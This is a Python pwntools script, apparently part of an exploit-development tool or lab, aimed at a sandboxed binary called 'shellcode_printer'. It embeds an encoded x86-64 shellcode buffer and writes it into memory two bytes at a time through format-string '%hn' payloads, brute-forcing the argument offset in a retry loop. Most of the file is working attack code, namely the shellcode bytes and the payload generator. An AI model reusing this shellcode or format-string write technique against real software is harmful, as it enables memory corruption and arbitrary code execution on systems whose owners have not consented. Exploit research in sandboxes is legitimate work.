
import sys
import os
from pwn import *
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

from dispatcher import Dispatcher
from exploit.string_bug import FormatStringExploit

dispatcher = Dispatcher({
            'mode': 'binary',
            'binary': 'target/sandbox/shellcode_printer',
            'type_binary': 'i',
            'type_input': 'stdin',
            'verbose': False
            })

exploit = FormatStringExploit(dispatcher, verbose=False)

buf =  b"\x90"
buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x76\xaf\xef\x69\x6e"
buf += b"\xf2\xb2\x51\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x3e\x17\xc0\x0b\x07\x9c\x9d\x22\x1e"
buf += b"\xaf\x76\x39\x3a\xad\xe0\x37\x1e\x82\x8c\x3d\x30"
buf += b"\xa0\x5a\x59\x76\xaf\xef\x46\x0c\x9b\xdc\x7e\x05"
buf += b"\xc7\xef\x3f\x39\xa6\xec\x3b\x4d\xf7\xe0\x6c\x6e"
buf += b"\xf2\xb2\x51"
print(f"Buffer length: {len(buf)}")
dispatcher.connect()
dispatcher.client.receive_response()

local_40 = 0x7ffff7ffa000
buffer = 0x555555556030 

for j in range(100, 2000):
    try:
        for i in range(0, len(buf), 2):
            payload = b"%" + str(int.from_bytes(buf[i:i+2], 'little')).encode() + b"c%" + str(j).encode() + b"$hn"
            # print(f"Sending payload: {payload}")
            dispatcher.client.send_request(payload)
            dispatcher.client.receive_response()
        dispatcher.client.send_request(b"")
        # from time import sleep
        # sleep(1)
        print(dispatcher.client.receive_response())
        dispatcher.client.close()
        # dispatcher.client.interactive()
    except Exception as e:
        # sleep(1)
        dispatcher.client.close()
        dispatcher.connect()
        dispatcher.client.receive_response()
        # print(f"Error occurred: {e}")